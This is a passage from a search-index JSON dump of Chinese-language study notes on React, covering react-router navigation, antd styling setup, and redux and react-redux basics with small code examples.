<p>\u5177\u4f53\u4f7f\u7528</p> <pre><code>// replace \u6ca1\u6709\u5386\u53f2\u8bb0\u5f55\nthis.props.history.repalce('/home/message');\n\n// push \u6709\u5386\u53f2\u8bb0\u5f55\nthis.props.history.push('/home/message');\n\n// \u5982\u679c\u9700\u8981\u4f20\u53c2\uff0c\u5bf9\u5e94\u4e09\u79cd\u53c2\u6570\u5f62\u5f0f(\u63a5\u6536\u4e5f\u9700\u8981\u4e09\u79cd\u5f62\u5f0f)\nthis.props.history.push(`/home/message/${id}`);\nthis.props.history.push(`/home/message?id=${id}`);\nthis.props.history.push('/home/message', {id});\n\nthis.props.history.goBack();\nthis.props.history.goForward();\nthis.props.history.go(-2);\nthis.props.history.go(2);\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#92-withrouter","title":"92 withRouter \u4f7f\u7528","text":"<p>\u5982\u679c\u60f3\u5728\u666e\u901a\u7ec4\u4ef6\u4e2d\u4f7f\u7528 history \u7684 API\uff0c\u90a3\u4e48\u9700\u8981\u4f7f\u7528 withRouter \u5305\u88f9\u4e00\u5c42\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4f7f\u7528\u8def\u7531\u7ec4\u4ef6\u7684 API \u4e86\u3002</p> <pre><code>import { withRouter } from 'react-router-dom';\n\nclass Demo extends React.Component {\n}\n\nexport default withRouter(Demo);\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#93-browserrouter-hashrouter","title":"93 BrowserRouter \u548c HashRouter \u6bd4\u8f83","text":"<ul> <li> <p>\u6280\u672f\u4e0d\u4e00\u6837\uff1aBrowser \u4f7f\u7528 H5 \u7684 history API\uff0c\u4e0d\u517c\u5bb9\u8001\u7248\u672c\uff1bHash \u4f7f\u7528 URL \u54c8\u5e0c\u503c\uff0c\u517c\u5bb9 IE 6</p> </li> <li> <p>Path \u663e\u793a\uff1aBrowser \u6ca1\u6709#\uff0cHash \u5fc5\u987b\u52a0 #</p> </li> <li> <p>\u5237\u65b0\u6d4f\u89c8\u5668\uff1fBrowser \u4e0d\u4f1a\u4e22\u5931 state \u53c2\u6570\uff0cHash \u4f1a\u4e22\u5931 state \u53c2\u6570</p> </li> <li> <p>Hash \u53ef\u80fd\u89e3\u51b3\u4e00\u4e9b\u8def\u5f84\u9519\u8bef\u7684\u95ee\u9898\uff08\u4f8b\u5982\u6837\u5f0f\u5f15\u5165\uff09</p> </li> <li> <p>\u5b9e\u9645\u4f7f\u7528\uff1aBrowserRouter \u4f7f\u7528\u8f83\u591a</p> </li> </ul>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/","title":"121React \u5168\u5bb6\u6876\u5165\u95e8\u6559\u7a0b 02","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 26205  \u9605\u8bfb53\u5206\u949f</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#react-ui","title":"\u7b2c\u516d\u7ae0 react-ui","text":"<p>\u5e38\u7528\u7684\u5f00\u6e90\u7ec4\u4ef6\u5e93\uff1amaterial-UI  ant-design</p> <p>\u6559\u7a0b\u7248\u672c\u65f6 4.8.2\uff0c\u9879\u76ee\u4e2d\u4f7f\u7528 2.x \u7248\u672c\uff0c\u6587\u6863\u548c\u5b9e\u9645\u4ee3\u7801\u53ef\u80fd\u6709\u5dee\u5f02\uff1b\u6ce8\u610f\u66f4\u65b0\u3002</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#95-antd","title":"95 antd\u6837\u5f0f\u7684\u6309\u9700\u5f15\u5165","text":"<p>\u6211\u4eec\u5f00\u59cb\u5f15\u5165\u5168\u90e8\u7684CSS\u6587\u4ef6\uff0c\u5b9e\u9645\u4e0a\u4f53\u79ef\u6bd4\u8f83\u5927\uff0860kb\uff09\uff0c\u6027\u80fd\u4e0d\u597d\uff0c\u6700\u597d\u4f7f\u7528\u6309\u9700\u5f15\u5165</p> <p>\u5728 create-react-app \u811a\u624b\u67b6\u4e2d\uff0c\u53ef\u4ee5\u8fdb\u884c\u4e0b\u9762\u7684\u914d\u7f6e</p> <pre><code>npm install react-app-rewired customize-cra babel-plugin-import\n</code></pre> <p>\u6539\u5199\u811a\u672c\u547d\u4ee4</p> <pre><code>\"script\": {\n  \"start\": \"react-app-rewired start\",\n  \"build\": \"react-app-rewired build\",\n  \"test\": \"react-app-rewired test\",\n}\n</code></pre> <p>\u589e\u52a0\u5355\u72ec\u7684\u914d\u7f6e\u6587\u4ef6 config-overrides.js \uff08\u9700\u8981 customize-cra \u5e93\uff0c\u5904\u7406\u81ea\u5b9a\u4e49\u914d\u7f6e\uff09</p> <pre><code>module.exports = function override(config, env) {\n  // \u8fd9\u91cc\u53ef\u4ee5\u6539\u5199\u9ed8\u8ba4\u7684 webpack \u914d\u7f6e\u6587\u4ef6\n  return config;\n}\n</code></pre> <p>\u5b9e\u9645\u4e0a\u6539\u6210\u8fd9\u6837</p> <pre><code>const { override, fixBabelImports } = require('customize-cra');\n\nmodule.exports = override(\n    fixBabelImports('import', {\n    libraryName: 'antd',\n    libraryDirectory: 'es',\n    style: 'css',\n  })\n);\n</code></pre> <p>\u66f4\u6539\u540e\uff0c\u5c31\u4e0d\u9700\u8981\u5728\u7ec4\u4ef6\u5185\u90e8\u5355\u72ec\u5f15\u5165\u5bf9\u5e94\u7684\u6837\u5f0f\u6587\u4ef6\u4e86</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#96-antd","title":"96 antd \u81ea\u5b9a\u4e49\u4e3b\u9898","text":"<p>Ant-design \u4f7f\u7528 less \u4f5c\u4e3a\u6837\u5f0f\u6587\u4ef6\uff0c\u6240\u4ee5\u81ea\u5b9a\u4e49\u6837\u5f0f\uff0c\u9700\u8981\u8986\u76d6\u539f\u6765\u7684\u6837\u5f0f\u6587\u4ef6\u3002</p> <pre><code>npm install less less-loader\n</code></pre> <p>\u66f4\u6539\u914d\u7f6e\u6587\u4ef6</p> <pre><code>const { override, fixBabelImports, addLessLoader } = require('customize-cra');\n\nmodule.exports = override(\n    fixBabelImports('import', {\n    libraryName: 'antd',\n    libraryDirectory: 'es',\n    style: true,\n  }),\n  // \u6ce8\u610f\uff1a\u8fd9\u91cc\u5b98\u7f51\u914d\u7f6e\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a lessLoader \u7248\u672c\u66f4\u65b0\u4e86\uff0c\u53c2\u6570\u66f4\u6539\u4e86\n  addLessLoader({\n    lessOptions: {\n      javascriptEnabled: true,\n        modifyVars: { '@primary-color': '#fff' },\n    }\n  }),\n);\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#redux","title":"\u7b2c\u4e03\u7ae0 redux","text":""},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#97-redux","title":"97 redux \u57fa\u672c","text":"<ul> <li>\u5b9a\u4e49\uff1aredux \u662f\u4e13\u95e8\u72b6\u6001\u7ba1\u7406\u7684\u7b2c\u4e09\u65b9\u5e93\uff0c\u548c react \u6ca1\u6709\u76f4\u63a5\u8054\u7cfb\uff08\u4e0d\u662fFacebook \u56e2\u961f\u51fa\u54c1\uff09\u96c6\u4e2d\u5f0f\u7ba1\u7406 react \u4e2d\u591a\u4e2a\u7ec4\u4ef6\u5171\u4eab\u7684\u72b6\u6001</li> <li>\u4f18\u70b9\uff1a\u89e3\u51b3\u4e86\u591a\u4e2a\u7ec4\u4ef6\u5171\u4eab\u72b6\u6001\u7684\u95ee\u9898\uff0c\u9002\u5e94\u4e8e\u4e0d\u540c\u7ec4\u4ef6\u901a\u4fe1\u6bd4\u8f83\u590d\u6742\u7684\u60c5\u51b5</li> <li>\u7f3a\u70b9\uff1a\u5b66\u4e60\u548c\u4f7f\u7528\u6210\u672c\u8f83\u9ad8\uff08\u7b80\u5355\u9879\u76ee\u4e0d\u7528\uff0c\u590d\u6742\u9879\u76ee\u4f7f\u7528\uff09</li> <li>\u5168\u90e8 state \u90fd\u4f7f\u7528 redux?  \u53ef\u4ee5\u628a\u9879\u76ee\u4e2d\u5171\u4eab\u7684 state \u4f7f\u7528 redux \u7ba1\u7406\uff0c\u7ec4\u4ef6\u79c1\u6709\u7684 state \u7ef4\u62a4\u5728\u5185\u90e8\u3002</li> </ul> <p>\u4e2a\u4eba\u60f3\u6cd5\uff1a\u5982\u679c\u591a\u4e2a\u7ec4\u4ef6\u9700\u8981\u5171\u4eab\u72b6\u6001\uff0c\u6700\u597d\u72b6\u6001\u548c\u7ec4\u4ef6\u662f\u5bf9\u5e94\u7684\uff0c\u5206\u6790\u7ec4\u4ef6\u62c6\u5206\u7684\u903b\u8f91\u662f\u5426\u5408\u7406\uff0c\u4f18\u5148\u8003\u8651\u72b6\u6001\u63d0\u5347\uff0c\u6b21\u8981\u8003\u8651 eventBus\uff0c\u6700\u540e\u8003\u8651 redux\u3002</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#98-redux","title":"98 Redux \u57fa\u672c\u6982\u5ff5\u548c\u5de5\u4f5c\u6d41\u7a0b","text":"<p>\u4e2a\u4eba\u7406\u89e3\u7684\u5de5\u4f5c\u6d41\u7a0b</p> <p>0\u3001\u521d\u59cb\u5316 Store \u8c03\u7528 Reducer \u5e76\u8bbe\u7f6e\u521d\u59cb\u72b6\u6001</p> <p>1\u3001React \u7ec4\u4ef6\u60f3\u8981\u66f4\u65b0\u72b6\u6001\uff0c\u53d1\u51fa\u4e00\u4e2a dispatch(Action),  {type, data}</p> <p>2\u3001Store \u63a5\u6536\u5230 Action\uff0c\u8f6c\u53d1\u7ed9 Reducer \u5904\u7406\uff08switch \u5904\u7406\u591a\u4e2a type\uff09</p> <p>3\u3001Reducer \u6839\u636e\u539f\u72b6\u6001 prevState \u548c Action\uff0c\u8ba1\u7b97\u51fa\u65b0\u7684\u72b6\u6001 newState \uff0c\u5e76\u8fd4\u56de\u5230 Store</p> <p>4\u3001Store \u4e2d\u72b6\u6001\u66f4\u65b0\uff0c\u91cd\u65b0\u6e32\u67d3\u6574\u4e2a\u7ec4\u4ef6\uff0c\u7ec4\u4ef6 getState \u83b7\u53d6\u6570\u636e\uff0c\u754c\u9762\u5237\u65b0\uff08\u9700\u8981\u63d0\u524d\u8ba2\u9605 Store \u66f4\u65b0\u7684\u4e8b\u4ef6\uff09</p> <p>\u8bf4\u660e\uff1a\u521d\u59cb Reducer \u65f6\uff0cprevState \u662f undefined, type \u662f\u968f\u673a\u5b57\u7b26\u4e32</p> <p>\u57fa\u672c\u6982\u5ff5</p> <ul> <li>action \u52a8\u4f5c\u5bf9\u8c61\uff08type \u552f\u4e00\uff0cdata \u53ef\u9009\u53c2\u6570\uff09</li> <li>reducer \u7528\u4e8e\u521d\u59cb\u5316\u6570\u636e\uff0c\u6216\u8005\u66f4\u65b0\u6570\u636e\uff08\u6839\u636e\u65e7 state \u548c action \u4ea7\u751f\u65b0\u7684 state \u7684\u7eaf\u51fd\u6570\uff09</li> <li>store \u8fde\u63a5 state action reducer \u7684\u6838\u5fc3\uff0c\u4e3b\u8981\u4f7f\u7528</li> </ul> <pre><code>import { createStore } form 'redux';\nimport demo_reducer from './demo_reducer';\n\nconst store = createStore(demo_reducer);\n\nexport default store;\n</code></pre> <p>\u57fa\u672c API</p> <pre><code>import store from './store';\n\nstore.getState();\nstore.dispatch(action);\nstore.subscribe(callback);\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#99-react","title":"99 \u4f7f\u7528 react \u5b9e\u73b0\u7684\u6c42\u548c\u6848\u4f8b","text":"<p>\u5b9e\u73b0\u4e00\u4e2a\u7b80\u5355\u7684\u52a0\u51cf\u6cd5\u8ba1\u7b97\u5668</p> <pre><code>import React from 'react';\n\nexport default class Count extends React.Component {\n\n  state = {\n    result: 0,\n  }\n\n  onAdd = () =&gt; {\n    this.setState({\n      result: this.state.result + this.selectRef.value * 1,\n    });\n  }\n\n  onDec = () =&gt; {\n    this.setState({\n      result: this.state.result - this.selectRef.value * 1,\n    });\n  }\n\n  render() {\n    return (\n      &lt;div&gt;\u7ed3\u679c\u662f {this.state.result} &lt;/div&gt;\n      &lt;select ref={node =&gt; this.selectRef = node}&gt;\n        &lt;option value='1'&gt;1&lt;/option&gt;\n        &lt;option value='2'&gt;2&lt;/option&gt;\n      &lt;/select&gt;\n      &lt;button onClick={this.onAdd}&gt;\u52a0&lt;/button&gt;\n      &lt;button onClick={this.onDec}&gt;\u51cf&lt;/button&gt;\n    );\n  }\n}\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#100","title":"100 \u5b9e\u73b0\u57fa\u672c\u8ba1\u7b97\u5668","text":"<p>\u57fa\u672c\u5b9e\u73b0\uff1a\u5165\u53e3\u6587\u4ef6 index \u7ec4\u4ef6 Count store reducer </p> <p>Store \u6574\u4e2a\u5e94\u7528\u7ef4\u62a4\u4e00\u4e2a store \u7ba1\u7406\u5168\u90e8\u7684 reducer</p> <pre><code>import { createStore } from 'redux';\nimport countReducer from './count_reducer';\n\nconst store = createStore(countReducer);\n\nexport default store;\n</code></pre> <p>Reducer \u672c\u8d28\u662f\u4e00\u4e2a\u51fd\u6570\uff0cStore \u4f1a\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\uff0c\u6bcf\u4e00\u4e2a reducer \u5bf9\u5e94\u4e00\u4e2a\u7ec4\u4ef6</p> <pre><code>const initState = 0;\n\n// \u9996\u6b21 Store \u521d\u59cb\u5316\u65f6\uff0cpreState \u662f undefined\uff0caction.type \u662f\u4e71\u7801\uff0c\u6240\u4ee5\u4f7f\u7528\u521d\u59cb\u503c\uff0c\u76f4\u63a5\u8fd4\u56de\nfunction countReducer(preState = initState, action) {\n  const { type, data } = action;\n  switch (type) {\n    case 'add':\n      return preState + data;\n    case 'reduce':\n      return preState - data;\n    default:\n      return preState;\n  }\n}\n\nexport default countReducer;\n</code></pre> <p>\u7ec4\u4ef6\u4e2d\u83b7\u53d6 state\uff0c\u53d1\u51fa action</p> <pre><code>import store from './store';\n\n// \u7ec4\u4ef6\u5185\u90e8\u7684 state \u4e0d\u53d8\uff0c\u548c redux \u4e0d\u51b2\u7a81\nstate = {\n  name: 'Mike'\n};\n\n// \u53ef\u4ee5\u5728\u7ec4\u4ef6\u5185\u90e8\u76d1\u542c\u72b6\u6001\u53d8\u5316\uff08\u6700\u597d\u5728\u5168\u5c40\u9876\u5c42\u7ec4\u4ef6\u76d1\u542c\u72b6\u6001\u53d8\u5316\uff0c\u89e6\u53d1\u56de\u8c03\u51fd\u6570\uff09\ncomponentDidMount() {\n  // \u53c2\u6570\u662f\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\uff08\u72b6\u6001\u53d8\u5316\u540e\uff0c\u5f3a\u5236\u66f4\u65b0\u8fd9\u4e2a\u7ec4\u4ef6\uff09\n  store.subscribe(() =&gt; {\n    this.forceUpdate();\n  })\n}\n\nonAdd = () =&gt; {\n  let action = new Action({ type: 'xxx', data: 1 });\n  store.dispatch(action);\n}\n</code></pre> <p>\u6700\u597d\u7684\u529e\u6cd5\u662f\u5165\u53e3\u51fd\u6570\u76d1\u542c state \u53d8\u5316\uff0c\u5e76\u89e6\u53d1\u5168\u5c40\u91cd\u65b0\u6e32\u67d3\uff08\u56e0\u4e3a diff \u7b97\u6cd5\uff0c\u786e\u4fdd\u5b9e\u9645\u6027\u80fd\u53ef\u4ee5\uff09</p> <pre><code>import React from 'react';\nimport ReactDOM from 'react-dom';\nimport App from './App';\nimport store from './redux/store';\n\nReactDOM.render(&lt;App/&gt;, document.getElementById('root'));\n\n// \u66f4\u65b0 state \u540e\uff0c\u6e32\u67d3\u5168\u90e8\u7ec4\u4ef6\nstore.subscribe(() =&gt; {\n  ReactDOM.render(&lt;App/&gt;, document.getElementById('root'));\n});\n</code></pre> <p>\u5c0f\u7ed3\uff1a\u4f7f\u7528 redux \u6b65\u9aa4</p> <p>1\u3001\u68c0\u67e5\u54ea\u4e9b state \u662f\u516c\u5171\u90e8\u5206\uff0c\u53bb\u6389\u7ec4\u4ef6\u539f\u6765\u7684 state</p> <p>2\u3001src \u4e0b\u9762\u5efa\u7acb redux \u76ee\u5f55\uff0c\u5185\u90e8\u5199\u5165 store reducer \u4f5c\u4e3a\u5355\u72ec\u7684\u6587\u4ef6\u76ee\u5f55</p> <p>3\u3001store \u4e2d\uff0c\u5f15\u5165 createStore(reducer) \u7136\u540e\u66b4\u9732\u8fd9\u4e2a store \u5bf9\u8c61</p> <p>4\u3001reducer \u4e2d\uff0c\u5904\u7406\u521d\u59cb\u5316\u72b6\u6001\u548c\u66f4\u65b0\u72b6\u6001\uff08\u7eaf\u51fd\u6570\uff09</p> <p>5\u3001index \u4e2d\u76d1\u542c store \u72b6\u6001\u6539\u53d8\uff0c\u6539\u53d8\u540e\u91cd\u65b0\u6e32\u67d3\u7ec4\u4ef6\u3002redux \u53ea\u5904\u7406\u72b6\u6001\u7ba1\u7406\uff0c\u72b6\u6001\u66f4\u65b0\u540e\u6e32\u67d3\u9875\u9762\u7684\u6b65\u9aa4\u9700\u8981\u6839\u636e\u9700\u6c42\u5b8c\u6210</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#101-redux","title":"101 redux \u5b8c\u6574\u7248","text":"<p>\u5728\u524d\u4e00\u8282\u8bfe\u7a0b\u57fa\u7840\u4e0a\uff0c\u628a count_action \u5355\u72ec\u62ff\u51fa\u6765\u505a\u6210\u4e00\u4e2a\u6587\u4ef6\uff0c\u4e13\u95e8\u4e3a Count \u751f\u6210 Action</p> <pre><code>export const addAction = (data) =&gt; { type: 'add', data };\nexport const decAction = (data) =&gt; { type: 'dec', data };\n</code></pre> <p>PS \u5982\u679c\u7bad\u5934\u51fd\u6570\u7684\u8fd4\u56de\u503c\u662f\u5bf9\u8c61\uff0c\u90a3\u4e48\u9700\u8981\u7528\u62ec\u53f7\u5305\u8d77\u6765</p> <pre><code>export const test = para =&gt; ({ type: 'add', data });\n</code></pre> <p>\u8fd9\u6837\u5199\uff0c\u53ef\u80fd\u4ea7\u751f\u9b54\u6cd5\u5b57\u7b26\u4e32\uff0c\u751f\u4ea7\u4e2d\u5982\u679c Action \u6bd4\u8f83\u591a\uff0c\u6700\u597d\u4f7f\u7528\u5e38\u91cf\u6587\u4ef6</p> <pre><code>export const INCREASE = 'increase';\nexport const DECREASE = 'decrease';\n</code></pre> <p>\u7136\u540e\u5728 action.js \u548c reducer \u4e2d\u5f15\u5165 constant \u5e38\u91cf\uff0c\u5373\u53ef\u89e3\u51b3\u9b54\u6cd5\u5b57\u7b26\u4e32\u95ee\u9898\u3002</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#102-action","title":"102 \u6c42\u548c\u6848\u4f8b-\u5f02\u6b65action\u7248","text":"<p>\u5b9e\u73b0\u5f02\u6b65\u6709\u4e24\u79cd\u529e\u6cd5\uff1aUI \u5c42\u901a\u8fc7 setTimeout \u5b9e\u73b0\u5b9a\u65f6\u6267\u884c</p> <pre><code>setTimeout(() =&gt; {\n  store.dispatch(createIncreasementAction(value));\n}, 1000);\n</code></pre> <p>\u6216\u8005\u5728 redux \u4e2d\u5b9e\u73b0\u5f02\u6b65\uff08\u9700\u8981\u52a0\u5165 middleware\uff09</p> <pre><code>store.dispatch(createIncrementAsyncAction(value))\n</code></pre> <pre><code>export const craeteIncrementAsyncAction = (data, time) =&gt; {\n  return (dispatch) =&gt; {\n    // action \u7684\u503c\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u65f6\u95f4\u8fc7\u53bb\u540e\uff0c\u6267\u884c\u8fd9\u4e2a\u51fd\u6570\n    setTimeout((time) =&gt; {\n      dispatch(createIncrementAction(data));\n    }, time);\n  }\n}\n</code></pre> <p>store </p> <pre><code>import { createStore, applyMiddleware } from 'redux';\nimport countReducer from './count-reducer';\n// \u652f\u6301\u5f02\u6b65 action\nimport thunk from 'redux-thunk';\n\nexport default createStore(countReducer, applyMiddleware(thunk));\n</code></pre> <p>\u5f02\u6b65 action\uff0c\u5b9e\u9645\u4f7f\u7528\u8f83\u5c11\uff08\u5b98\u65b9\u6587\u6863\u548c\u4ee3\u7801\u4e0d\u4e00\u5b9a\u5bf9\u5e94\uff0c\u8fd9\u662f\u5f88\u5927\u7684\u95ee\u9898\uff0c\u53ef\u80fd\u4f9d\u8d56\u7684\u7b2c\u4e09\u65b9\u5e93\u53d8\u5316\u4e86\uff0c\u9020\u6210\u5b98\u65b9\u6587\u6863\u4f20\u53c2\u65e0\u6548\uff09</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#103-react-redux","title":"103 react-redux","text":"<p>\u8bbe\u8ba1\u7406\u5ff5\uff1aUI \u7ec4\u4ef6\u5916\u5c42\u52a0\u4e00\u4e2a\u5bb9\u5668\u7ec4\u4ef6\uff1b\u5bb9\u5668\u7ec4\u4ef6\u548c redux \u8fdb\u884c\u72b6\u6001\u4ea4\u4e92\uff08\u4f7f\u7528 redux \u7684 API\uff09UI \u7ec4\u4ef6\u548c\u5bb9\u5668\u7ec4\u4ef6\uff0c\u4f7f\u7528 props \u4f20\u53c2\uff0c\u4e0d\u76f4\u63a5\u4f7f\u7528 redux \u7684 API\u3002</p> <p>\u4e5f\u5c31\u662f\u8bf4\uff0cUI \u7ec4\u4ef6\u548c redux \u4e2d\u95f4\u52a0\u4e86\u4e00\u5c42\u5bb9\u5668\u7ec4\u4ef6\uff0c\u5904\u7406 redux \u7684\u72b6\u6001\u66f4\u65b0\u3002</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#104-ui","title":"104 UI \u7ec4\u4ef6\u548c\u5bb9\u5668\u7ec4\u4ef6\u4f20\u53c2","text":"<p>\u5bb9\u5668\u7ec4\u4ef6</p> <pre><code>import CountUI from '../../components/Count';\nimport store from '../../redux/store';\n// connext \u7528\u4e8e\u8fde\u63a5 UI \u7ec4\u4ef6\u548c\u5bb9\u5668\u7ec4\u4ef6\nimport { connect } from 'react-redux';\n\n// \u73b0\u5728\u8fd9\u6837\u5199\uff0c\u628a\u5bb9\u5668\u7ec4\u4ef6\u548c UI \u7ec4\u4ef6\u8fde\u63a5\u4e86\uff0c\u4f46\u662f\u8fd8\u6ca1\u6709\u548c redux \u94fe\u63a5\nexport default connect()(CountUI);\n</code></pre> <p>\u6e32\u67d3\u5bb9\u5668\u7ec4\u4ef6</p> <pre><code>import React from 'react';\nimport Count from './container/Count';\nimport store from './redux/store';\n\nexport default class App extends React.Component {\n  render() {\n    return (\n        &lt;Count/&gt;\n    );\n  }\n}\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#105","title":"105 \u6570\u636e\u4ea4\u4e92","text":"<p>\u9700\u8981\u5728\u6839\u7ec4\u4ef6\u4e2d\uff0c\u8ba2\u9605\u6570\u636e\u53d8\u5316\uff0c\u7136\u540e\u66f4\u65b0\u72b6\u6001\uff08\u4e0b\u9762\u662f\u8fc7\u7a0b\u4ee3\u7801\uff0c\u4e0d\u662f\u6700\u540e\u5b9e\u73b0\u4ee3\u7801\uff09</p> <pre><code>import React from 'react';\nimport ReactDOM from 'react-dom';\nimport App from './App';\nimport store from './redux/store';\n\nReactDOM.render(&lt;App /&gt;, document.getElementById('root'));\n\n// \u5f53\u72b6\u6001\u53d8\u5316\u65f6\uff0c\u91cd\u65b0\u6e32\u67d3\u5168\u90e8\u7684\u7ec4\u4ef6\uff08\u628a\u65b0\u7684\u72b6\u6001\u4f20\u4e0b\u53bb\uff09\nstore.subscribe(() =&gt; {\n  ReactDOM.render(&lt;App /&gt;, document.getElementById('root'));\n});\n</code></pre> <p>\u66f4\u6539\u540e\u7684\u5bb9\u5668\u7ec4\u4ef6\uff08\u5bb9\u5668\u7ec4\u4ef6\u548c redux \u4ea4\u4e92\uff09</p> <pre><code>import CountUI from '../../components/Count';\n\nimport { connect } from 'react-redux';\n\n// \u4ee5 props \u7684\u5f62\u5f0f\u8fd4\u56de\uff0cstate\u5148\u5b58\u4e00\u4e2a\u6570\u503c\uff08\u6b63\u5e38\u5e94\u8be5\u5b58\u4e00\u4e2a\u5bf9\u8c61\uff09\nfunction a(state) {\n  return { count: state };\n}\n\nfunction b() {\n  return {\n    add: (number) =&gt; {\n      console.log(1);\n      // store.dispatch({ type: 'increase', data: number });\n      dispatch(createIncrementAction(number));\n    }\n  }\n}\n\nexport default connect(a, b)(CountUI);\n</code></pre> <p>\u7ee7\u7eed\u66f4\u6539</p> <pre><code>import CountUI from '../../components/Count';\nimport { createIncrementAction } from '../../redux/count_action';\nimport { connect } from 'react-redux';\n\n// \u8fd4\u56de\u5bf9\u8c61\uff0c\u4f5c\u4e3a props \u4f20\u9012\u7ed9 UI \u7ec4\u4ef6\uff0c\u7528\u4e8e\u4f20\u9012\u72b6\u6001\nfunction mapStateToProps(state) {\n  return { count: state };\n}\n\n// \u8fd4\u56de\u5bf9\u8c61\uff0c\u901a\u8fc7 props \u4f20\u9012\u7ed9\u5b50\u7ec4\u4ef6\uff0c\u7528\u4e8e\u64cd\u4f5c\u72b6\u6001\u7684\u65b9\u6cd5(\u4e5f\u53ef\u4ee5\u7b80\u5316\u6210\u5bf9\u8c61)\nfunction mapDispatchToProps(dispatch) {\n  return {\n    add: number =&gt; dispatch(createIncrementAction(number)),\n    del: number =&gt; dispatch(createDecreaseAction(number)),\n  }\n}\n\n// \u4f7f\u7528 connect()() \u521b\u5efa\u5e76\u66b4\u9732 Count \u7684\u5bb9\u5668\u7ec4\u4ef6\nexport default connect(mapStateToProps, mapDispatchToProps)(CountUI);\n</code></pre> <p>\u5c0f\u7ed3</p> <p>UI \u7ec4\u4ef6\uff1a\u4e0d\u80fd\u4f7f\u7528\u4efb\u4f55 redux \u7684 api, \u53ea\u8d1f\u8d23\u754c\u9762\u7684\u4ea4\u4e92\u548c\u5448\u73b0</p> <p>\u5bb9\u5668\u7ec4\u4ef6\uff1a\u8d1f\u8d23\u548c redux \u901a\u4fe1\uff0c\u5c06\u7ed3\u679c\u4ea4\u7ed9 UI \u7ec4\u4ef6</p> <p>\u600e\u6837\u521b\u5efa\u5bb9\u5668\u7ec4\u4ef6\uff1f\u2014\u2014connect \u51fd\u6570</p> <p>\u5bb9\u5668\u4e2d\u7684 store \u662f\u4f9d\u9760 props \u4f20\u5165\u7684\uff0c\u5e76\u4e0d\u662f\u76f4\u63a5 import </p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#106-1-mapdispatch","title":"106 \u4f18\u53161-\u7b80\u5199mapDispatch","text":"<pre><code>export default connect(\n    state =&gt; ({ count: state }),\n  dispatch =&gt; (\n    add: num =&gt; dispatch(createIncrementAction(number)),\n    del: number =&gt; dispatch(createDecreaseAction(number)),\n  ),\n)(CountUI);\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/#107-2-provider","title":"107 \u4f18\u53162-Provider\u7ec4\u4ef6\u7684\u4f7f\u7528","text":"<pre><code>import App from './App';\nimport store from './redux/store';\nimport { Provider } from 